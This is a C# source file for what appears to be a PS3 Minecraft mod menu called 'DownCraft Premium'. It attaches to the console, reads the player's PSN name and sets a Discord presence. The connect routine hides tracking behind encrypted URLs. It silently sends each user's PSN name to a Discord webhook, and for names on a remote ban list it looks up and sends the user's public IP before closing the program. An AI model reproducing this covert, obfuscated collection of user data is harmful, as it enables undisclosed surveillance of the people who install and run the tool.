#region "Library"

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PS3Lib;
using Flagsec;
using DiscordRpcDemo;
using System.Net;
using static MisakiAulait.Misaki;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using System.Net.Http;

#endregion

namespace DownCraft
{
    public class Functions
    {
        private DiscordRpc.EventHandlers handlers;
        private DiscordRpc.RichPresence presence;
        public PS3API PS3 = new PS3API();
        public string LINK = Decrypt("ME3ncj2HpTExlTZ7h2KDSwnnZxQKCKVyim6EzFcFEyOuJZATF4Axh+aqItb3OBpGX5TnVAAZueaE05kgzfalmbBT/dW/8DjYMJHrgPebbrVf3ts3MWkuI08O7yO6eg0UwbKDlPwHViLGKZTxfoGQTHyrvOv9PObU7y87onXF7RTSyMm+GWWbILCLq+9eOJ/pJiWAw8dtAgFIxMF5KWuQWAPXKQYFaiWHZpY1tyJXlSPC7zC55B6zrPyW1ZBnt3NVwxH3B18ASWk0l4XxTb6oWfeFwdp00rZjGn/IjgJots95bpZqzwvxh3YrlYGSr3sJYIF8Dvo15Ww=");

        public string DefaultName; //Backup of the PSN Name

        #region "Send WebHook funcs"

        //USED FOR WEBHOOK
        public void WebHook(string token, string name, string picture, string message)
        {
            Webhook hook = new Webhook(token);
            hook.Name = name;
            hook.ProfilePictureUrl = picture;

            hook.SendMessage(message);
        }

        #endregion

        #region "Connect & Attach"

        public void Connect()
        {
            if (MessageBox.Show("Press 'YES' for HEN and press 'NO' for TMAPI", "DownCraft Premium", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                PS3.ChangeAPI(SelectAPI.ControlConsole);
            }
            else
            {
                PS3.ChangeAPI(SelectAPI.TargetManager);
            }

            try
            {
                if (PS3.ConnectTarget())
                {
                    MessageBox.Show("Connected to PS3 !", "DownCraft Premium", MessageBoxButtons.OK, MessageBoxIcon.Information);

                    try
                    {
                        if (PS3.AttachProcess())
                        {

                            MessageBox.Show("Attached to PS3 !", "DownCraft Premium", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            DefaultName = PS3.Extension.ReadString(0x3000AD34); //////NAME SLOT OF MINECRAFT

                            //RPC DISCORD
                            string[] IMG = { "amy", "eye", "paimon", "zerotwo", "blood", "hanako", "panty", "dick", "hinata", "sayori" };
                            string RandomIMG = IMG[new Random().Next(0, IMG.Length)];

                            this.handlers = default(DiscordRpc.EventHandlers); //FOR RPC DISCORD
                            DiscordRpc.Initialize("850326514335088643", ref this.handlers, true, null);
                            this.handlers = default(DiscordRpc.EventHandlers);
                            DiscordRpc.Initialize("850326514335088643", ref this.handlers, true, null);
                            this.presence.details = "Connected To PS3";

                            System.DateTime epoch = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
                            long cur_time = (long)(System.DateTime.UtcNow - epoch).TotalSeconds;

                            presence.startTimestamp = cur_time;
                            this.presence.state = "Made by Misakiii";
                            this.presence.largeImageKey = RandomIMG;
                            this.presence.largeImageText = "DownCraft Premium\nUpdate V14\nMade By Misakiii\nPSN: " + DefaultName + "";
                            DiscordRpc.UpdatePresence(ref this.presence);

                            if (DefaultName == "")
                            {
                                DefaultName = PS3.Extension.ReadString(0x3000ABA4); //name of profils player
                            }

                            //ban a user with his PSN
                            WebClient BAN = new WebClient();
                            string GET_USER = BAN.DownloadString(Decrypt("ME3ncj2HpTExlTZ7h2KDS7tHJwoSVivPeVyZmK7+qosxJe92Ke0YhHx5f9hItseS/0pwhhxs05sUacmNFbOcvuIhbycI7K42"));

                            if (DefaultName == GET_USER)
                            {
                                MessageBox.Show("Don't try to play with me, i'm better than you <3");

                                string[] AVATAR1 = { "https://pbs.twimg.com/media/Cw6mWuqWIAAQx_5.jpg", "https://imgcloud.pw/images/2019/06/19/yvumaobmgfeb376003c61ff3ba9d.jpg", "https://i.imgur.com/7PdJUhd.jpg", "https://i.imgur.com/kRzV4hu.png" };
                                string RandomAvatar1 = AVATAR1[new Random().Next(0, AVATAR1.Length)];

                                string[] Emojis1 = { "🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹" };
                                string RandomEmojis1 = Emojis1[new Random().Next(0, Emojis1.Length)];
                                string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");

                                WebHook(LINK, "DownCraft Logs", RandomAvatar1, "```" + RandomEmojis1 + " User: " + DefaultName + " are trying to connect but he his banned here his IP: " + externalip + " " + RandomEmojis1 + "```");
                                Application.Exit();
                            }

                            string[] AVATAR = { "https://pbs.twimg.com/media/Cw6mWuqWIAAQx_5.jpg", "https://imgcloud.pw/images/2019/06/19/yvumaobmgfeb376003c61ff3ba9d.jpg", "https://i.imgur.com/7PdJUhd.jpg", "https://i.imgur.com/kRzV4hu.png" };
                            string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];

                            string[] Emojis = { "🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹" };
                            string RandomEmojis = Emojis[new Random().Next(0, Emojis.Length)];

                            WebHook(LINK, "DownCraft Logs", RandomAvatar, "```" + RandomEmojis + " User: " + DefaultName + " is now connected to his PS3 HEN with DownCraft Premium Edition. " + RandomEmojis + "```");
                        }
                        else
                        {
                            MessageBox.Show("Client Not Attached To PS3 !", "DownCraft Premium", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("Unknow Error, Bot Attached To PS3 !", "DownCraft Premium", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                else
                {
                    MessageBox.Show("Not Connected to PS3 !", "DownCraft Premium", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Unknow Error Not Connected to PS3 !", "DownCraft Premium", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void Disconnect()
        {
            PS3.DisconnectTarget();
        }

        #endregion

    }
}